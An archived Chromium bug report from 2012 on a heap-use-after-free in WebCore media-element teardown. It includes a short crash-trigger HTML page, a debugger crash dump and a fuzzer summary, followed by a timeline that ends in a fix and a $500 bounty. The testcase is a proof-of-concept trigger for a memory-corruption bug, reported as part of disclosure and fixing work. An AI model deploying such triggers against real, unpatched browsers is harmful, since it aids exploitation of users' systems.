# Heap-use-after-free in WebCore::GenericEventQueue::~GenericEventQueue

| Field | Value |
|-------|-------|
| **Issue ID** | [40055333](https://issues.chromium.org/issues/40055333) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | sl...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-03-21 |
| **Bounty** | $500.00 |

## Description

Crashes on windows dev 19.0.1068.1 (126852) and canary 19.0.1075.0 (127639). Can't reproduce on stable.

----- crash1.html -----

<!DOCTYPE html>

<script>
    function reloading() {
        window.open('crash1.html', '_self');
    }
    setTimeout("reloading()", 200);

    window.onload = main;

    function main(){
        window.document.body.innerHTML = 'foo';
    }
</script>

<!-- 
audio tag is not necessary but increases the probability of catching this 
-->
<audio src="water.mp3"></audio>
<video autoplay src="bear.mp4"></video>

-----------------------

(1d74.1dc8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0293b930 ebx=00f55580 ecx=0293b540 edx=0293b7e0 esi=00000000 edi=00000000
eip=0293b7e0 esp=001feca8 ebp=001fecd4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
0293b7e0 20b6930230b9    and     byte ptr [esi-46CFFD6Dh],dh ds:0023:b9300293=??

ExceptionAddress: 0293b7e0
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000008
   Parameter[1]: 0293b7e0
Attempt to execute non-executable address 0293b7e0

ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
001feca4 5f975f2c 0x293b7e0
001fecd4 5f975cd5 chrome_5ef50000!WebCore::HTMLMediaElement::~HTMLMediaElement+0x232
001fece0 5f2e0b92 chrome_5ef50000!WebCore::HTMLMediaElement::`scalar deleting destructor'+0xb
001fece8 5f04edce chrome_5ef50000!v8::String::ExternalStringResourceBase::Dispose+0xc
001fecf0 5f04ed43 chrome_5ef50000!WebCore::Event::~Event+0x3a
001fecfc 5f90a57a chrome_5ef50000!WebCore::Event::`scalar deleting destructor'+0xb
001fed08 5fa05b1d chrome_5ef50000!WTF::VectorDestructor<1,WTF::RefPtr<WebCore::LayerChromium> >::destruct+0x29
001fed18 5f975f61 chrome_5ef50000!WebCore::GenericEventQueue::~GenericEventQueue+0x2b
001fed44 5f99fde2 chrome_5ef50000!WebCore::HTMLMediaElement::~HTMLMediaElement+0x267
001fed50 5f2e0b92 chrome_5ef50000!WebCore::HTMLVideoElement::`scalar deleting destructor'+0x1f
001fed58 5f04edce chrome_5ef50000!v8::String::ExternalStringResourceBase::Dispose+0xc
001fed60 5f04ed43 chrome_5ef50000!WebCore::Event::~Event+0x3a
001fed6c 5f90a57a chrome_5ef50000!WebCore::Event::`scalar deleting destructor'+0xb
001fed78 5fa05df7 chrome_5ef50000!WTF::VectorDestructor<1,WTF::RefPtr<WebCore::LayerChromium> >::destruct+0x29
001fedf8 5f978c3f chrome_5ef50000!WebCore::GenericEventQueue::cancelAllEvents+0x35
001fee78 5f97c938 chrome_5ef50000!WebCore::HTMLMediaElement::cancelPendingEventsAndCallbacks+0x15
001feef8 5f129566 chrome_5ef50000!WebCore::HTMLMediaElement::stop+0x7e
001fef20 5f12928d chrome_5ef50000!WebCore::ScriptExecutionContext::stopActiveDOMObjects+0x4c
001fef38 5f03c877 chrome_5ef50000!WebCore::Document::detach+0x47
001fef9c 5f03c625 chrome_5ef50000!WebCore::Frame::setView+0x49
001fefb8 5f03c27a chrome_5ef50000!WebCore::Frame::createView+0x3c
001ff020 5f03b946 chrome_5ef50000!WebKit::WebFrameImpl::createFrameView+0xa8
001ff038 5f03ad36 chrome_5ef50000!WebCore::FrameLoader::transitionToCommitted+0x21a
001ff19c 5f1210a6 chrome_5ef50000!WebCore::FrameLoader::commitProvisionalLoad+0xd2
001ff1b4 5f121065 chrome_5ef50000!WebCore::DocumentLoader::commitLoad+0x3c
001ff1c8 5f120e3a chrome_5ef50000!WebCore::DocumentLoader::receivedData+0x45
[...]


## Attachments

- [water.mp3](attachments/water.mp3) (audio/mpeg; charset=binary, 88.6 KB)
- [crash1.html](attachments/crash1.html) (text/html; charset=us-ascii, 412 B)
- [stack1.txt](attachments/stack1.txt) (text/x-c++; charset=us-ascii, 8.3 KB)
- [bear.mp4](attachments/bear.mp4) (video/mp4; charset=binary, 40.1 KB)
- [crash_2.html](attachments/crash_2.html) (text/html; charset=us-ascii, 306 B)
- [bear_silent.webm](attachments/bear_silent.webm) (application/octet-stream; charset=binary, 44.7 KB)
- [crash_3.html](attachments/crash_3.html) (text/html; charset=us-ascii, 59.8 KB)

## Timeline

### in...@chromium.org (2012-03-21)

We already know about this regression, we didnt file it yet since it wasn't a reliable crash and we were just waiting on ClusterFuzz to hit on a good repro. This regressed very recently like 2-3 days back. Let me try your testcase to see the regression range.

### sl...@gmail.com (2012-03-21)

I caught it on dev 19.0.1061.1 (126342) first time.

### in...@chromium.org (2012-03-22)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=29325317

Fuzzer: Inferno_layout_test_fuzzer

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x7f2c2d6ae088
Crash State:
  - crash stack -
  WebCore::GenericEventQueue::~GenericEventQueue
  WebCore::HTMLMediaElement::~HTMLMediaElement
  - free stack -
  WTF::Vector<WTF::RefPtr<WebCore::Event>, 0ul>::shrinkCapacity
  WebCore::HTMLMediaElement::stop

### in...@chromium.org (2012-03-22)

I think it regressed from http://trac.webkit.org/changeset/106156.

Slaweck, your repro is not reproducible, can you please try providing a better repro.

### sl...@gmail.com (2012-03-23)

I have not mentioned it before, crash1.html needs few reloads to crash. crash_2.html should crash at first reload. Please, try to tweak 't' value if it still not reproduce bug.
(crash_3.html include video file in 'data:' scheme)

### sl...@gmail.com (2012-03-23)

...and I can not reproduce it on linux at all.

### sc...@gmail.com (2012-03-28)

See repro file from kuzzcc on https://crbug.com/chromium/120591, which I'm about to mark as a duplicate. Perhaps it's more reliable?

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-28)

Dont worry Guys, media expert Eric Carlson has an idea on the patch upstream.

### in...@chromium.org (2012-03-29)

Actually, i jumped on this :)!

### ka...@google.com (2012-03-30)

[Empty comment from Monorail migration]

### ka...@google.com (2012-03-30)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-30)

http://trac.webkit.org/changeset/112623

### in...@chromium.org (2012-03-30)

merged to m19 in r112636. trying to see if it helps in decreasing m19 renderer crashes.

### sc...@gmail.com (2012-04-02)

M18: http://trac.webkit.org/changeset/112905

Nice find @slaweck! Adding reward-topanel

### sc...@gmail.com (2012-04-04)

Thank you @slaweck. Although we had already hit this in our internal fuzzing, we hadn't really narrowed down to a reasonable test case. Therefore, the panel saw that your report provided some value and awarded $500.


### sc...@gmail.com (2012-04-04)

https://bugs.webkit.org/show_bug.cgi?id=81976

### sc...@gmail.com (2012-05-10)

Payment in system.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/119281?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/120591]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055333)*
